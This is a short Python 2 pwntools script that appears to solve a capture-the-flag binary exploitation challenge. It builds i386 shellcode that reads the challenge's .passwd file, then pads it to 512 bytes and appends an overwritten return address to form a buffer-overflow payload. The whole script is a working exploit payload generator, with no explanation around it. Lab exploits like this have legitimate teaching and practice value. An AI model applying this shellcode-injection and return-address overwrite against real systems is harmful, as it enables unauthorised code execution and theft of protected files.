from pwn import *

context.clear(arch = 'i386')

s = pwnlib.shellcraft.i386.linux.cat('/challenge/app-systeme/ch7/.passwd').rstrip()
s += pwnlib.shellcraft.i386.linux.syscall('SYS_exit', 0).rstrip()

def toCode(shellcraft):
    res = ''
    s = asm(shellcraft).encode('hex')
    if len(s) % 2 == 1:
        raise 'Shell craft length must be even'
    for i in range(len(s)):
        if i % 2 == 0: res += '\\x'
        res += s[i]
    return res


username_bss = 0x8048120
size = 512

shellcraftLength = len(asm(s))

print shellcraftLength
payload = toCode(s) + 'a'*(size - shellcraftLength) + '\\x40\\xa0\\x04\\x08'

print payload
print len(payload)
